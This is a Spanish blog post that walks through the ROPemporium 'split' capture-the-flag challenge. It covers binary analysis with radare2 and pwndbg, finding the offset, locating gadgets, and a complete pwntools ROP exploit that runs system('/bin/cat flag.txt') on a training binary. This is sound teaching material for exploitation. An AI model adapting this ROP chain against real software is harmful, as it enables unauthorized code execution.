---
layout: post
title: ROPemporium split - Usando ROP para escribir en RDI
author: c4rta
date: 2023-01-15
##categories: [Explotacion binaria]
tags: [Explotacion Binaria, ROP]
image: /assets/img/spilt/waifu.jpg
---
Resolucion del desafio split de ROPemporium, donde usaremos el gadget pop rdi; ret para escribir en RDI la direccion de /bin/cat flag
{:.lead}

## A tomar en cuenta

- La dirección máxima en 64 bits es ```0x00007FFFFFFFFFFF``` y el RIP no puede sobrescribir una dirección mayor que este valor. 
- Los parámetros de función se pasan a los registros. Estos registros son RDI, RSI, RDX, RSX, R8, R9, respectivamente. Si el número de parámetros es superior a 6, se guardan en el stack

## Analizando el binario

Primeramente veremos con que protecciones cuenta el binario, esto con ```checksec```:

```
checksec --file=split                                             ─╯
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70 Symbols	  No	0		3		split
```
Como se puede ver tiene ```NX``` asi que no podemos ejecutar codigo en el stack, asi que para resolverlo vamos a usar ROP (Programacion Orientada el Retorno).

Ahora metere el binario a radare2 para ver lo que esta haciendo en el main:

![](/assets/img/spilt/radare1.png)

Aqui lo unico interesante es que se esta llamando a la funcion ```pwnme``` en la direccion ```0x004006d2```. Y lo demas simplemente es el mensajito de bienvenida.

En la funcion ```pwnme``` tenemos esto:

![](/assets/img/spilt/radare2.png)

- En color rojo se esta declarando un puntero llamado ```buf``` que esta 0x20 por debajo del ```RBP```
- En color amarillo se esta creando un buffer de ```0x20``` (32 bytes) el cual se almacena en ```buf```
- En color verde es cuando el programa recibe nuestro input el cual lee ```0x60``` bytes en ```buf```.

Esto no es todo, siempre hay que mostrar todas las funciones en un programa, en radare lo hacemos con ```alf```. Veamos:

![](/assets/img/spilt/radare3.png)

Vemos como existe una funcion llamada ```usefulFunction``` la cual nunca se llama en el programa, y si vemos codigo tenemos algo como esto:

![](/assets/img/spilt/radare4.png)

Se esta haciendo uso de la funcion ```system``` para llamar a ```/bin/ls```, esto no es lo que queremos, nosotros queremos que llame a ```/bin/cat flag.txt```, y la pregunta es... ¿Como yo se que en el binario se esta llamando a ```/bin/cat flag.txt```?, pues facil, simplemente podemos mostrar los strings con ```rabin2 -z split```:

![](/assets/img/spilt/radare5.png)

Podemos ver que en la seccion ```.data``` esta ```/bin/cat flag.txt```, asi que tenemos que sustituirlo por ```/bin/ls```


## Crafteando el exploit

### Sacando el offset del RIP

Con ```pwndbg``` voy a ocasionar que el buffer pete pasandole la cadena generada por ```cyclic 100```, y deberiamos ver algo como esto:

```
*RBP  0x6161616161616165 ('eaaaaaaa')
*RSP  0x7fffffffda78 ◂— 0x6161616161616166 ('faaaaaaa')
*RIP  0x400741 (pwnme+89) ◂— ret 
───────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
 ► 0x400741 <pwnme+89>    ret    <0x6161616161616166>
```

Vemos que no sobrescribimos RIP en absoluto. Esto se debe a que sobrescribimos RIP con una dirección no válida mayor que ```0x00007fffffffffff```. Esto hace que el sistema operativo genere una excepción, y por lo tanto, no actualice el valor de RIP en absoluto. 

Asi que para sacar su offset podemos usar el registro ```RSP```, para sacar el offset de ```RSP``` ponemos ```cyclic -l faaaaaaa``` y esto nos da un offset de ```40```, este offset es el mismo que tiene el ```saved-rip```, y tiene el mismo ya que el ```saved rip``` tiene el valor guardado del puntero de instruccion, es decir, adonde regresar, pero este valor se guarda en el stack en una direccion en particular, y esa direccion es ```0x7fffffffda78```, esto lo podemos saber si mostramos el frame y vemos esta parte:

```
 Saved registers:
  rip at 0x7fffffffda78
```
Y si mostramos unos cuantos byes del stack, con el comando ```x/30wx $rsp``` vemos algo como esto:

```
0x7fffffffda78:	0x61616166	0x61616161	0x61616167	0x61616161
0x7fffffffda88:	0x61616168	0x61616161	0x61616169	0x61616161
0x7fffffffda98:	0x6161616a	0x61616161	0x6161616b	0x61616161
0x7fffffffdaa8:	0x6161616c	0x61616161	0xffffdb98	0x00007fff
0x7fffffffdab8:	0x35f3056c	0x394c8b3a	0x00000000	0x00000000
0x7fffffffdac8:	0xffffdba8	0x00007fff	0x00000000	0x00000000
0x7fffffffdad8:	0xf7ffd000	0x00007fff	0x80d1056c	0xc6b374c5
0x7fffffffdae8:	0xb179056c	0xc6b36486
```
En donde en la direccion ```0x7fffffffda78``` tenemos los valores ```0x61616166	0x61616161```, los cuales son los mismos que tiene el ```RSP```, asi que podemos decir que el ```saved rip``` tiene el valor ```0x6161616161616166``` y el ```RSP``` el valor ```faaaaaaa``` (que es lo mismo que ```0x6161616161616166``` pero en decimal), ademas podemos tambien hacer un ```cyclic -l 0x6161616161616166``` y nos dara un offset de 40 al igual que el ```RSP```. Y como ultimo, en este caso le estamos indicando al programa que regrese a ```0x6161616161616166```, lo cual es incorrecto. Y por toda esta explicacion es la razon por la cual el ```saved rip``` y el ```RSP``` tienen el mismo offset (nunca habia explicado esto y es bueno saberlo).

### Direccion de system

Esto es muy facil, para esto, usaremos la direccion de system que se encuentra en la funcion ```usefulFunction```, como se puede ver aca:

![](/assets/img/spilt/radare6.png)

La direccion es: ```0x000000000040074b```

### Direccion de /bin/cat flag.txt

Esto lo hacemos con ```rabin2 -z split``` y copiamos la direccion, la cual es: ```0x00601060```

### Direccion de pop rdi

Como mencione hace un rato, usamos esto para meter en el registro rdi: ```/bin/cat flag.txt```. La direccion de pop rdi la podemos sacar con herramientas como ropper, la cual nos permiten ver todos los gadgets del programa. Usamos el comando ```ropper -f split```.

Vemos como nos encontro el gadget:

```0x00000000004007c3: pop rdi; ret; ``` y su direccion es ```0x00000000004007c3```

## Ejecutando el exploit

Al final nuestro exploit quedo asi:

```py
from pwn import *

p = process("./split")

padding = b"A" * 40
system = 0x000000000040074b
bin_cat = 0x00601060
pop_rdi = 0x00000000004007c3

payload = padding
payload += p64(pop_rdi)
payload += p64(bin_cat)
payload += p64(system)

p.sendline(payload)
print(p.recvall().decode())
```

Y lo que hicimos fue:

- Cambiar el return adress a la dirección de pop rdi; ret.
- Después del return adress, pusimos la dirección de /bin/cat flag.txt
- Después de la dirección de /bin/cat flag.txt, pusimos la dirección de system@plt

De esta manera después de la última instrucción de ```pwnme``` se ejecute (osea el ```ret```), el ```RIP``` saltara a la dirección de ```pop rdi;ret```, simultáneamente el ```RSP``` apuntará ahora a la dirección de ```/bin/cat flag.txt```. Luego se pondrá en ```rdi``` la dirección de ```/bin/cat flag.txt``` y el ```ret``` ejecutará la funcion```system``` que tiene como argumento ```/bin/cat flag.txt``` :point_up: 🤓  

Y al ejecutarlo nos da la flag:

![](/assets/img/spilt/exploit.png)

Eso ha sido todo, gracias por leer ❤
